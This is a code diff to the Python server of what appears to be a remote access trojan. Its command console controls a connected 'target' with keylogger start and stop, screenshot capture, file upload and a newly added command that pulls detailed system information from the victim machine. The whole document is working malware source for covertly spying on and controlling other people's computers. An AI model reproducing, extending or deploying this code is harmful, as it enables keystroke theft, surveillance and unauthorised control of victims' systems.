@@ -102,6 +102,10 @@ class Server:
         except Exception as e_screenshot:
             print(f"Screenshot error: {e_screenshot}")
 
+    def target_sys_info(self):
+        target_sys = self.receive_data_as_json()
+        print(target_sys)
+
     def main(self):
         self.base_filename = datetime.now().strftime("%d-%m-%Y_%H-%M")
         self.log_filename = f'{self.base_filename}.txt'
@@ -115,13 +119,13 @@ class Server:
         # Accept a connection from the target
         self.target_socket, r_host = self.server_socket.accept()
         print("[+] connected to: " + str(r_host))
-
+        print("\n[*] Type: info\n")
         while True:
             command = input("[$] shell~# ")
             if command == '':
                 continue
 
-            elif command.lower() == 'help':
+            elif command.lower() == 'info':
                 print("""
 
                     [*] Shell commands:
@@ -137,6 +141,7 @@ class Server:
 
                     • upload <file_name> - Upload a file to the target.
 
+                    • target info - Get target detailed info.
 
                     • clear or cls - Clear the screen.
 
@@ -164,13 +169,13 @@ class Server:
                 os.system(clear_command)
                 continue
 
-            elif command.lower() == 'keyscan_start':
+            elif command.startswith('keyscan_start'):
                 print("[+] Keylogger started.")
                 thread_Log = threading.Thread(target=self.thread_logger)
                 thread_Log.start()
                 continue
 
-            elif command.lower() == 'keyscan_stop':
+            elif command.startswith('keyscan_stop'):
                 self.dump_log_file()
                 self.stop_logging = 1
                 print("[-] Keylogger stopped.")
@@ -186,6 +191,10 @@ class Server:
 
             elif command.startswith('screenshot'):
                 self.screen_shot()
+                continue
+
+            elif command.startswith('target info'):
+                self.target_sys_info()
                 continue
 
             else:
